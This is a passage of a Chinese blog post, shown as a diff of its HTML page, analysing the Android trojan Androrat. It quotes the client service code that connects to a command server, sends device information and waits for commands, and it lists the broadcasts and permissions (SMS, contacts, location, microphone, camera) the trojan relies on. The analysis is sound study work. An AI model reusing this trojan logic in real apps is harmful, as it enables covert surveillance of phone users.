+					<span class="n">readthread</span><span class="o">.</span><span class="na">start</span><span class="o">();</span> <span class="c1">//On commence vraiment a écouter</span>
+					<span class="n">CommandPacket</span> <span class="n">pack</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CommandPacket</span><span class="o">(</span><span class="n">Protocol</span><span class="o">.</span><span class="na">CONNECT</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">infos</span><span class="o">.</span><span class="na">getBasicInfos</span><span class="o">());</span>
+					<span class="n">handleData</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span><span class="n">pack</span><span class="o">.</span><span class="na">build</span><span class="o">());</span>					
+					<span class="c1">//gps = new GPSListener(this, LocationManager.NETWORK_PROVIDER,(short)4); //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span>
+					<span class="n">isListening</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+					<span class="k">if</span><span class="o">(</span><span class="n">waitTrigger</span><span class="o">)</span> <span class="o">{</span>
+						<span class="n">unregisterReceiver</span><span class="o">(</span><span class="n">SMSreceiver</span><span class="o">);</span> <span class="c1">//On désenregistre SMS et Call pour éviter tout appel inutile</span>
+						<span class="n">unregisterReceiver</span><span class="o">(</span><span class="n">Callreceiver</span><span class="o">);</span>
+						<span class="n">waitTrigger</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+					<span class="o">}</span>
+				<span class="o">}</span>
+				<span class="k">else</span> <span class="o">{</span>
+					<span class="k">if</span><span class="o">(</span><span class="n">isConnected</span><span class="o">)</span> <span class="o">{</span> <span class="c1">//On programme le AlarmListener car y a un probleme coté serveur</span>
+						<span class="n">resetConnectionAttempts</span><span class="o">();</span>
+						<span class="n">reconnectionAttempts</span><span class="o">();</span>
+					<span class="o">}</span>
+					<span class="k">else</span> <span class="o">{</span> <span class="c1">//On attend l'update du ConnectivityListener pour se débloquer </span>
+						<span class="n">Log</span><span class="o">.</span><span class="na">w</span><span class="o">(</span><span class="n">TAG</span><span class="o">,</span><span class="s">"Not Connected wait a Network update"</span><span class="o">);</span>
+					<span class="o">}</span>
+				<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>如果连接建立成功，实例化CommandPacket用于处理Server端的命令，然后建立一个监听线程，等待Server端命令（对于Client如何和Server交互，我会作为下一篇文章的重点来讲）。然后获取系统基础信息进行封装，通过handleData方法发送至Server端。下面是handleData方法的代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">handleData</span><span class="o">(</span><span class="kt">int</span> <span class="n">channel</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
+		<span class="n">conn</span><span class="o">.</span><span class="na">sendData</span><span class="o">(</span><span class="n">channel</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>
+	<span class="o">}</span>
+
+</code></pre>
+</div>
+
+<p>后面设置监听判断为true，如果在配置中设定了是否开启来电或短信提醒触发Client启动，则卸载SMSreceiver和Callreceiver模块（已经建立连接了，不再需要监听），设置waitTrigger为false。</p>
+
+<p>如果连接建立失效则重置连接，然后尝试重新连接。</p>
+
+<p>我们来看onStartCommand最后的这一段代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>		<span class="k">else</span> <span class="o">{</span> <span class="c1">//Le service a déjà été lancé</span>
+			<span class="k">if</span><span class="o">(</span><span class="n">isListening</span><span class="o">)</span> <span class="o">{</span>
+				<span class="n">Log</span><span class="o">.</span><span class="na">w</span><span class="o">(</span><span class="n">TAG</span><span class="o">,</span><span class="s">"Called uselessly by: "</span><span class="o">+</span> <span class="n">who</span> <span class="o">+</span> <span class="s">" (already listening)"</span><span class="o">);</span>
+			<span class="o">}</span>
+			<span class="k">else</span> <span class="o">{</span> <span class="c1">//Sa veut dire qu'on a reçu un broadcast sms ou call</span>
+				<span class="c1">//On est ici soit par AlarmListener, ConnectivityManager, SMS/Call ou X</span>
+				<span class="c1">//Dans tout les cas le but ici est de se connecter</span>
+				<span class="n">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">TAG</span><span class="o">,</span><span class="s">"Connection by : "</span><span class="o">+</span><span class="n">who</span><span class="o">);</span>
+				<span class="k">if</span><span class="o">(</span><span class="n">conn</span><span class="o">.</span><span class="na">connect</span><span class="o">())</span> <span class="o">{</span>
+					<span class="n">readthread</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">()</span> <span class="o">{</span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span> <span class="n">waitInstruction</span><span class="o">();</span> <span class="o">}</span> <span class="o">});</span>
+					<span class="n">readthread</span><span class="o">.</span><span class="na">start</span><span class="o">();</span> <span class="c1">//On commence vraiment a écouter</span>
+					<span class="n">CommandPacket</span> <span class="n">pack</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CommandPacket</span><span class="o">(</span><span class="n">Protocol</span><span class="o">.</span><span class="na">CONNECT</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">infos</span><span class="o">.</span><span class="na">getBasicInfos</span><span class="o">());</span>
+					<span class="n">handleData</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span><span class="n">pack</span><span class="o">.</span><span class="na">build</span><span class="o">());</span>
+					<span class="n">isListening</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+					<span class="k">if</span><span class="o">(</span><span class="n">waitTrigger</span><span class="o">)</span> <span class="o">{</span>
+						<span class="n">unregisterReceiver</span><span class="o">(</span><span class="n">SMSreceiver</span><span class="o">);</span>
+						<span class="n">unregisterReceiver</span><span class="o">(</span><span class="n">Callreceiver</span><span class="o">);</span>
+						<span class="n">waitTrigger</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span> <span class="c1">//In case of disconnect does not wait again for a trigger</span>
+					<span class="o">}</span>
+				<span class="o">}</span>
+				<span class="k">else</span> <span class="o">{</span><span class="c1">//On a encore une fois pas réussi a se connecter</span>
+					<span class="n">reconnectionAttempts</span><span class="o">();</span> <span class="c1">// Va relancer l'alarmListener</span>
+				<span class="o">}</span>
+			<span class="o">}</span>
+		<span class="o">}</span>
+		 
+		<span class="k">return</span> <span class="n">START_STICKY</span><span class="o">;</span>
+</code></pre>
+</div>
+
+<p>如果服务已经运行，判断是否已经开启监听，如果没有开启，则重复之前那段代码的工作。不同的只是在连接失败时不进行重置连接的功能，只尝试重新连接。</p>
+
+<h2 id="0x05-总结">0x05 总结</h2>
+
+<p>到这里这篇文章的任务已经完成了，下一篇文章我将重点分析Server端对Client发送的命令是如何被处理的。</p>
+
+<p>在分析的过程中，对于各种广播的理解完全靠官方文档，英文理解起来也没有中文省力，所以打算整理一份比较全面的Android中广播和权限的中文说明。我会先在每篇文章最后添加我新已经理解的广播或者权限的对照说明。</p>
+
+<p><em>PS.结尾吐槽一下，写这种文章真心好累，不过对于整体的梳理和一些分析过程中的盲点细节有很好的补充，算是有苦有甜吧。</em></p>
+
+<h2 id="0x06-广播对照说明">0x06 广播对照说明</h2>
+
+<ul>
+  <li>开机广播：android.intent.action.BOOT_COMPLETED</li>
+  <li>打入电话广播：android.intent.action.PHONE_STATE</li>
+  <li>打出电话广播：android.intent.action.NEW_OUTGOING_CALL</li>
+  <li>SMS消息提醒广播：android.provider.Telephony.SMS_RECEIVED</li>
+  <li>2g、3g、wifi等网络切换广播：android.net.conn.CONNECTIVITY_CHANGE</li>
+  <li>进入主界面广播：android.intent.action.MAIN</li>
+</ul>
+
+<h2 id="0x07-权限对照说明">0x07 权限对照说明</h2>
+
+<ul>
+  <li>获知短信到来权限：android.permission.RECEIVE_SMS</li>
+  <li>读取短信权限：android.permission.READ_SMS</li>
+  <li>发送短信权限：android.permission.SEND_SMS</li>
+  <li>访问电话状态权限：android.permission.READ_PHONE_STATE</li>
+  <li>拨打电话权限，允许程序从非系统拨号器里输入电话号码：  android.permission.CALL_PHONE</li>
+  <li>通话权限，允许程序拨打电话，替换系统的拨号器界面：android.permission.CALL_PRIVILEGED</li>
+  <li>处理拨出电话，允许程序监视，修改或放弃播出电话：android.permission.PROCESS_OUTGOING_CALLS</li>
+  <li>获取通讯录内容权限：android.permission.READ_CONTACTS</li>
+  <li>获取网络状态权限：android.permission.ACCESS_NETWORK_STATE</li>
+  <li>获取粗略定位权限：android.permission.ACCESS_COARSE_LOCATION</li>
+  <li>获取精确定位权限：android.permission.ACCESS_FINE_LOCATION</li>
+  <li>访问Internet权限：android.permission.INTERNET</li>
+  <li>录音权限：android.permission.RECORD_AUDIO</li>
+  <li>扩展存储（SD卡）写权限：android.permission.WRITE_EXTERNAL_STORAGE</li>
+  <li>操控相机权限：android.permission.CAMERA</li>
+  <li>开机启动权限：android.permission.RECEIVE_BOOT_COMPLETED</li>
+  <li>操控手机震动权限：android.permission.VIBRATE</li>
+</ul>
+
+
+</div>
+
+<div class="related">
+  <h2>相关文章:</h2>
+  <ul class="related-posts">
+    
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2017/04/09/%E5%89%96%E6%9E%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%ACAndrorat-%E7%BB%88.html">
+            剖析安卓木马Androrat（终）
+            <small>09 Apr 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2017/04/09/%E5%89%96%E6%9E%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%ACAndrorat-%E4%BA%8C.html">
+            剖析安卓木马Androrat（二）
+            <small>09 Apr 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2017/03/21/%E4%B9%9F%E8%B0%88S2-045.html">
+            也谈S2-045
+            <small>21 Mar 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+    
+  </ul>
+</div>
+
+
+<!-- UY BEGIN -->
+<div id="uyan_frame"></div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2093529"></script>
+<!-- UY END -->
+
+    </div>
+
+  </body>
+</html>
